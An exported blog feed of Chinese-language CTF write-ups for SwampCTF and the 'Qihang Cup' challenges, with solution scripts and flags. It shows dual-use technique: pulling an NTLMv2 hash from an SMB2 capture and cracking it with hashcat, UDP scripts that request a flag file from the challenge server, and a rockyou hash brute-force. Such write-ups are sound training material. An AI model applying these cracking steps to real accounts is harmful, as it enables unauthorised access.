TQkqGCAKovuOCovsDHQ5JOVs7qpJm3V8Ks=&quot;&quot;,&quot;&quot;time&quot;&quot;:7&#125;&#125;]&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload部分base64解码</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203043893.png" alt="image-20250331194455003"></p><p><img src="F:/mydata/Typora_photo/image-20250331194532775-1743424126436-10.png" alt="image-20250331194532775"></p><blockquote><p>swampCTF{1pf5-b453d-d474b453}</p></blockquote><h3 id="MuddyWater"><a href="#MuddyWater" class="headerlink" title="MuddyWater"></a>MuddyWater</h3><blockquote><p>We caught a threat actor, called MuddyWater, bruteforcing a login for our Domain Controller. We have a packet capture of the intrustion. Can you figure out which account they logged in to and what the password is?</p><p>Flag format is <code>swampCTF&#123;&lt;username&gt;:&lt;password&gt;&#125;</code></p></blockquote><p>筛选SMB2，找到验证通过时的数据包</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203123107.png" alt="img"></p><p>寻找报文的上下关系</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203148208.png" alt="img"></p><p>ntlmssp_auto下找到NTProofstr和NTLMv2 Response(NTLMv2 Response开头包含了NTProofstr的值，需要去掉)</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203157043.png" alt="img"></p><p>同时找到domain和user name</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203218606.png" alt="img"></p><p>ntlmssp_challenge下找到NTLM Server Challenge的值</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203232597.png" alt="img"></p><blockquote><p>username::domain:ntlmv2_response.chall:ntproofstr:不包含ntproofstr的ntlmv2_response值</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### smb2.txt</span><br><span class="line">hackbackzip::DESKTOP-0TNOE4V:d102444d56e078f4:eb1b0afc1eef819c1dccd514c9623201:01010000000000006f233d3d9f9edb01755959535466696d0000000002001e004400450053004b0054004f0050002d00300054004e004f0045003400560001001e004400450053004b0054004f0050002d00300054004e004f0045003400560004001e004400450053004b0054004f0050002d00300054004e004f0045003400560003001e004400450053004b0054004f0050002d00300054004e004f00450034005600070008006f233d3d9f9edb010900280063006900660073002f004400450053004b0054004f0050002d00300054004e004f004500340056000000000000000000</span><br></pre></td></tr></table></figure><p>hashcat爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 34405@Warmlight D:\....\hashcat-6.2.6  .\hashcat.exe -m 5600 .\smb2.txt .\passphrases.txt --show</span><br><span class="line">HACKBACKZIP::DESKTOP-0TNOE4V:d102444d56e078f4:eb1b0afc1eef819c1dccd514c9623201:01010000000000006f233d3d9f9edb01755959535466696d0000000002001e004400450053004b0054004f0050002d00300054004e004f0045003400560001001e004400450053004b0054004f0050002d00300054004e004f0045003400560004001e004400450053004b0054004f0050002d00300054004e004f0045003400560003001e004400450053004b0054004f0050002d00300054004e004f00450034005600070008006f233d3d9f9edb010900280063006900660073002f004400450053004b0054004f0050002d00300054004e004f004500340056000000000000000000:pikeplace</span><br><span class="line"> 34405@Warmlight D:\....\hashcat-6.2.6 </span><br></pre></td></tr></table></figure><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203330773.png" alt="img"></p><h3 id="Proto-Proto"><a href="#Proto-Proto" class="headerlink" title="Proto Proto"></a>Proto Proto</h3><blockquote><p>Moto Moto likes you. But not enough to explain how his server works. We got a pcap of the client and server communicating. Can you figure out how the server works and retrieve the flag?</p><p>chals.swampctf.com:44254</p></blockquote><p>给的url无法访问</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203326822.png" alt="image-20250331115508754"></p><p>筛选UDP流量，发现flag字符（假的）</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203337773.png" alt="image-20250331115841058"></p><p>追踪UDP流，通信过程未进行加密，客户端先请求读取flag，然后服务端进行数据响应，我们可通过UDP服务请求先服务端来读取flag</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203342673.png" alt="image-20250331114442536"></p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置服务器地址和端口</span></span><br><span class="line">server = <span class="string">&quot;chals.swampctf.com&quot;</span></span><br><span class="line">port = <span class="number">44254</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义负载</span></span><br><span class="line">payload = <span class="string">b&quot;\x02\x08\x66\x6c\x61\x67\x2e\x74\x78\x74&quot;</span>  <span class="comment">#&quot;flag.txt&quot;的二进制编码</span></span><br><span class="line"><span class="comment"># \x02表示命令</span></span><br><span class="line"><span class="comment"># \x08表示filename的长度len(flag.txt)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建UDP套接字</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment"># socket.AF_INET：指定使用IPv4地址族。</span></span><br><span class="line"><span class="comment"># socket.SOCK_DGRAM：指定使用UDP协议。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送负载到服务器</span></span><br><span class="line">s.sendto(payload, (server, port))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 接收服务器的响应</span></span><br><span class="line">response, addr = s.recvfrom(<span class="number">4096</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 打印响应</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HEX response:&quot;</span>, response.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded response:&quot;</span>, response.decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203346185.png" alt="image-20250331111832079"></p><blockquote><p>swampCTF{r3v3r53_my_pr070_l1k3_m070_m070}</p></blockquote><h3 id="Proto-Proto-2"><a href="#Proto-Proto-2" class="headerlink" title="Proto Proto 2"></a>Proto Proto 2</h3><blockquote><p>Moto Moto heard you were able to reverse his server code, so he set up some “encryption”. Can you figure out the key and retrieve the flag?</p><p>chals.swampctf.com:44255</p></blockquote><p>跟上一题一样的思路，首先筛选UDP流并追踪</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203351872.png" alt="image-20250331155544413"></p><p>可以看到客户端请求内容为：<code>super_secret_password.flag.txt</code>,这里查看flag文件需要传入一个password，</p><p>分析报文格式</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203356074.png" alt="image-20250331155731140"></p><p>传输的数据格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload  = <span class="string">b&quot;\x02&quot;</span></span><br><span class="line">payload += <span class="built_in">len</span>(key).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>) </span><br><span class="line">payload += key</span><br><span class="line">payload += <span class="built_in">len</span>(<span class="string">b&quot;flag.txt&quot;</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&quot;flag.txt&quot;</span></span><br></pre></td></tr></table></figure><p>根据题目信息，key设置为<code>encryption</code>，输出了flag的尾部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HEX response: 077f4666705641454e785c3037305f6d3037305f35384832425e32635732045f345f6e305f6e307d0a</span><br><span class="line">Decoded response: FfpVAENx\070_m070_58H2B^2cW2_4_n0_n0&#125;</span><br></pre></td></tr></table></figure><p>key为<code>swampCTF&#123;y0u_kn0w_b3773r_7h4n_7h47&#125;</code>时，输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HEX response: 07695f646f5f7265616c4b652c0c467a70340652686a11624278757f0a33350d32082b345c6d387f14</span><br><span class="line">Decoded response: i_do_realKe,</span><br><span class="line">Fzp4RhjbBxu</span><br><span class="line">+4\m8</span><br></pre></td></tr></table></figure><p>注意到<code>i_do_real</code>部分</p><p>再将<code>i_do_real</code>作为key输入为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HEX response: 077377616d704354467b5b0a3d3c7266252235590439490e4242237b57020e55054e7928437306760b</span><br><span class="line">Decoded response: swampCTF&#123;[</span><br><span class="line">=&lt;rf%&quot;5Y9IBB#&#123;WUNy(Csv</span><br></pre></td></tr></table></figure><p>此时看到了flag的头部，大致可以猜测这是一个对称加密，加密秘钥为<code>i_do_real_encryption</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;i_do_real_encryption&quot;</span></span><br><span class="line"><span class="comment"># 定义负载</span></span><br><span class="line">payload  = <span class="string">b&quot;\x02&quot;</span> </span><br><span class="line">payload += <span class="built_in">len</span>(key).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">payload += key</span><br><span class="line">payload += <span class="string">b&quot;\x08\x66\x6c\x61\x67\x2e\x74\x78\x74&quot;</span></span><br><span class="line"></span><br><span class="line">server = <span class="string">&#x27;chals.swampctf.com&#x27;</span></span><br><span class="line">port = <span class="number">44255</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建UDP套接字</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment"># socket.AF_INET：指定使用IPv4地址族。</span></span><br><span class="line"><span class="comment"># socket.SOCK_DGRAM：指定使用UDP协议。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送负载到服务器</span></span><br><span class="line">s.sendto(payload, (server, port))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 接收服务器的响应</span></span><br><span class="line">response, addr = s.recvfrom(<span class="number">4096</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 打印响应</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HEX response:&quot;</span>, response.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded response:&quot;</span>, response.decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>swampCTF{m070_m070_54y5_x0r_15_4_n0_n0}</p></blockquote><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Rock-my-Password"><a href="#Rock-my-Password" class="headerlink" title="Rock my Password"></a>Rock my Password</h3><blockquote><h4 id="Rock-my-Password—150"><a href="#Rock-my-Password—150" class="headerlink" title="Rock my Password—150"></a>Rock my Password—150</h4><p>I’ve come up with an extremely secure(tm) way to store my password, noone will be able to reverse it! I’ve hashed it with md5 100 times, then sha256 100 times, then sha512 100 times! There’s no way you’re going to be able to undo it &gt;:3 I’ll even tell you it was in the RockYou database, and the password is 10 characters long, that’s how confident I am!</p><p>The flag is in the format: swampCTF{RockYouPassword}</p><p>As a reminder, please don’t flood our infrastructure with guesses.</p><p>Hashed Password (Flag): f600d59a5cdd245a45297079299f2fcd811a8c5461d979f09b73d21b11fbb4f899389e588745c6a9af13749eebbdc2e72336cc57ccf90953e6f9096996a58dcc</p><p>Note: The entire flag (swampCTF{rockyoupassword}) was hashed to get the provided hash, not just rockyoupassword</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apply_hash_n_times</span>(<span class="params">data, hash_func, n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = hash_func(data).digest()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    target_hash = <span class="string">&quot;f600d59a5cdd245a45297079299f2fcd811a8c5461d979f09b73d21b11fbb4f899389e588745c6a9af13749eebbdc2e72336cc57ccf90953e6f9096996a58dcc&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Assuming rockyou.txt is in the same directory</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rockyou.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;latin-1&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            password = line.strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(password) == <span class="number">10</span>:</span><br><span class="line">                flag = <span class="string">f&quot;swampCTF&#123;&#123;<span class="subst">&#123;password&#125;</span>&#125;&#125;&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># MD5 100 times</span></span><br><span class="line">                md5_hash = flag</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">                    md5_hash = hashlib.md5(md5_hash).digest()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># SHA256 100 times</span></span><br><span class="line">                sha256_hash = md5_hash</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">                    sha256_hash = hashlib.sha256(sha256_hash).digest()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># SHA512 100 times</span></span><br><span class="line">                sha512_hash = sha256_hash</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">                    sha512_hash = hashlib.sha512(sha512_hash).digest()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># Compare</span></span><br><span class="line">                <span class="keyword">if</span> sha512_hash.<span class="built_in">hex</span>() == target_hash:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Found password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Flag: swampCTF&#123;&#123;<span class="subst">&#123;password&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Password not found in rockyou.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><blockquote><p>swampCTF{secretcode}</p></blockquote><hr><h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><h3 id="You-Shall-Not-Passss"><a href="#You-Shall-Not-Passss" class="headerlink" title="You Shall Not Passss"></a>You Shall Not Passss</h3><p>main()函数，前面都是在写字符串，动调直接跳过去，从sub_580F548E67E0()进去</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203412209.png" alt="img"></p><p>sub_580F548E67E0()</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203445585.png" alt="img"></p><p>动调之后，中间数据都转换成代码</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203415144.png" alt="img"></p><p>转换过后可以看到加密验证的逻辑</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203419731.png" alt="img"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">cipher, a</span>):</span><br><span class="line"></span><br><span class="line">    flag = []</span><br><span class="line">    tmp = a</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> cipher:</span><br><span class="line">        <span class="comment"># 计算当前的伪随机数</span></span><br><span class="line">        tmp = (<span class="number">330</span> * tmp + <span class="number">100</span>) % <span class="number">0x8FF</span></span><br><span class="line">        <span class="comment"># 恢复原始数据</span></span><br><span class="line">        original_byte = byte ^ (tmp &amp; <span class="number">0xFF</span>)</span><br><span class="line">        flag.append(original_byte)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据</span></span><br><span class="line">cipher = [<span class="number">0xDD</span>, <span class="number">0x9A</span>, <span class="number">0xDE</span>, <span class="number">0x4E</span>, <span class="number">0x69</span>, <span class="number">0xE1</span>, <span class="number">0xE9</span>, <span class="number">0x2C</span>, <span class="number">0xD2</span>, <span class="number">0x4E</span>, <span class="number">0xEC</span>, <span class="number">0xE7</span>, <span class="number">0x18</span>, <span class="number">0x26</span>, <span class="number">0x6A</span>, <span class="number">0x56</span>, <span class="number">0x79</span>, <span class="number">0xD8</span>, <span class="number">0xA3</span>, <span class="number">0x55</span>, <span class="number">0x72</span>, <span class="number">0xBC</span>, <span class="number">0x76</span>, <span class="number">0xC4</span>, <span class="number">0x0C</span>, <span class="number">0x0F</span>, <span class="number">0x9B</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>, <span class="number">0x81</span>, <span class="number">0xE2</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0xA0</span>, <span class="number">0xF4</span>, <span class="number">0x26</span>]  </span><br><span class="line">a = <span class="number">1</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密数据</span></span><br><span class="line">flag = decrypt_data(cipher, a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的字节数据转换为字符串</span></span><br><span class="line">decrypted_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, decrypted_text)</span><br></pre></td></tr></table></figure><blockquote><p>swampCTF{531F_L0AD1NG_T0TALLY_RUL3Z}</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一届“启航杯”网络安全挑战赛-Writeup</title>
      <link href="/2025/01/26/%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-Writeup/"/>
      <url>/2025/01/26/%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-Writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>reverse部分三道题都比较简单，当做刷熟练度了，大部分时间去做misc和取证了，取证还没来得及复现，先发一部分，还是太懒了，要复现的越欠越多。。。</p></blockquote><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="checker"><a href="#checker" class="headerlink" title="checker"></a>checker</h3><p>主函数逻辑很简单，就是先输入然后调用<code>check</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126003757477.png" alt="image-20250125235959031"></p><p>验证函数，调用了加密函数，然后用加密结果去和密文比较，密文已经给了，直接dump就行</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126003803010.png" alt="image-20250126000040325"></p><p><code>encrypted_flag</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126003806201.png" alt="image-20250126000332032"></p><p>加密函数&#96;&#96;encrypt_flag<code>，逐位亦或</code>0x23&#96;</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126003808471.png" alt="image-20250126000516430"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x6B</span>, <span class="number">0x60</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x58</span>, <span class="number">0x46</span>, <span class="number">0x46</span>,</span><br><span class="line">    <span class="number">0x15</span>, <span class="number">0x40</span>, <span class="number">0x14</span>, <span class="number">0x41</span>, <span class="number">0x1A</span>, <span class="number">0x40</span>, <span class="number">0x0E</span>, <span class="number">0x46</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x45</span>, <span class="number">0x16</span>, <span class="number">0x0E</span>, <span class="number">0x17</span>, <span class="number">0x45</span>, <span class="number">0x42</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x1A</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0x45</span>, <span class="number">0x0E</span>, <span class="number">0x46</span>, <span class="number">0x42</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x46</span>, <span class="number">0x13</span>, <span class="number">0x10</span>, <span class="number">0x17</span>, <span class="number">0x45</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x16</span>, <span class="number">0x5E</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">xor_value = <span class="number">0x23</span></span><br><span class="line">result_chars = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(byte ^ xor_value) <span class="keyword">for</span> byte <span class="keyword">in</span> data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, result_chars)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag: QHCTF&#123;ee6c7b9c-e7f5-4fab-9bdf-ea07e034f6a5&#125;</span></span><br></pre></td></tr></table></figure><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>查壳，<code>upx -d</code>直接可以脱掉</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126003811865.png" alt="image-20250126003653524"></p><p>主函数，对<code>dest</code>加密得到密文<code>s2</code>，将得到的密文和输入的密码进行check，<code>dest</code>直接dump，注意这里是43字节</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126003814462.png" alt="image-20250126002228013"></p><p>加密函数，这里进行了两次亦或，<code>v6</code>是小端序，四字节<code>42 37 A1 7C</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126003819018.png" alt="image-20250126002320044"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x42</span>, <span class="number">0x37</span>, <span class="number">0xA1</span>, <span class="number">0x7C</span>]</span><br><span class="line">dest = [<span class="number">0x12</span>, <span class="number">0x7D</span>, <span class="number">0xE1</span>, <span class="number">0x2C</span>, <span class="number">0x01</span>, <span class="number">0x4A</span>, <span class="number">0xC4</span>, <span class="number">0x45</span>, <span class="number">0x78</span>, <span class="number">0x5E</span>, <span class="number">0xC9</span>, <span class="number">0x46</span>, <span class="number">0x78</span>, <span class="number">0x5D</span>, <span class="number">0x83</span>, <span class="number">0x0F</span>, <span class="number">0x37</span>, <span class="number">0x12</span>, <span class="number">0xD0</span>, <span class="number">0x45</span>, <span class="number">0x63</span>, <span class="number">0x42</span>, <span class="number">0xD5</span>, <span class="number">0x57</span>, <span class="number">0x76</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x06</span>, <span class="number">0x6E</span>, <span class="number">0x04</span>, <span class="number">0x8F</span>, <span class="number">0x3E</span>, <span class="number">0x50</span>, <span class="number">0x21</span>, <span class="number">0xE1</span>, <span class="number">0x3B</span>, <span class="number">0x53</span>, <span class="number">0x72</span>, <span class="number">0xB7</span>, <span class="number">0x6C</span>, <span class="number">0x5D</span>, <span class="number">0x79</span>, <span class="number">0xF7</span>]</span><br><span class="line">a2 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dest)):</span><br><span class="line">    tmp = dest[i] ^ key[i % <span class="number">4</span>]  </span><br><span class="line">    tmp = tmp ^ (i + <span class="number">1</span>)      </span><br><span class="line">    a2.append(<span class="built_in">chr</span>(tmp))       </span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(a2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span>,result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag:  QHCTF&#123;b13cc67d-cd7b-4cc3-9df1-1b34cc4c186d&#125;</span></span><br></pre></td></tr></table></figure><h3 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h3><p>附件给了加密密文</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126003822380.png" alt="image-20250126002853129"></p><p>其他不用管，直接进<code>hide_flag()</code>函数</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126003824993.png" alt="image-20250126003028048"></p><p>加密是直接亦或了<code>0x5A</code></p><p><img 